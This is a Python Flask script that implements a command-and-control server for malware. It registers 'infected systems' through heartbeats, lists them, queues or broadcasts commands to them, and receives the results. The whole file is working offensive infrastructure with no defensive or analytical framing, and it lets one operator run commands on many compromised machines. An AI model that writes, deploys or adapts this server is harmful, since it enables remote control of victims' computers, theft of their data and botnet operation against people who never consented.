#!/usr/bin/env python3
from flask import Flask, request, jsonify
from datetime import datetime
import json
import threading

app = Flask(__name__)

# Store connected clients
clients = {}
commands = {}

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """Receive heartbeat from infected systems"""
    data = request.json or request.form
    
    client_id = f"{data.get('ip')}-{data.get('hostname')}"
    clients[client_id] = {
        'last_seen': datetime.now().isoformat(),
        'data': data,
        'pending_command': commands.get(client_id)
    }
    
    # Return any pending command
    response = {'command': 'none'}
    if client_id in commands:
        response['command'] = commands.pop(client_id)
    
    print(f"[+] Heartbeat from {client_id}")
    return jsonify(response)

@app.route('/command', methods=['POST'])
def set_command():
    """Set command for specific client"""
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id and command:
        commands[client_id] = command
        return jsonify({'status': 'command set'})
    
    return jsonify({'status': 'failed'})

@app.route('/clients', methods=['GET'])
def list_clients():
    """List all connected clients"""
    return jsonify(clients)

@app.route('/broadcast', methods=['POST'])
def broadcast_command():
    """Broadcast command to all clients"""
    data = request.json
    command = data.get('command')
    
    if command:
        for client_id in clients.keys():
            commands[client_id] = command
        
        return jsonify({'status': 'broadcasted', 'clients': len(clients)})
    
    return jsonify({'status': 'failed'})

@app.route('/result', methods=['POST'])
def command_result():
    """Receive command execution results"""
    data = request.json
    print(f"[+] Command result: {data}")
    return jsonify({'status': 'received'})

def run_c2():
    """Run C2 server"""
    print("[*] Starting C2 server on http://0.0.0.0:5000")
    print("[*] Dashboard: http://localhost:5000/clients")
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == "__main__":
    run_c2()
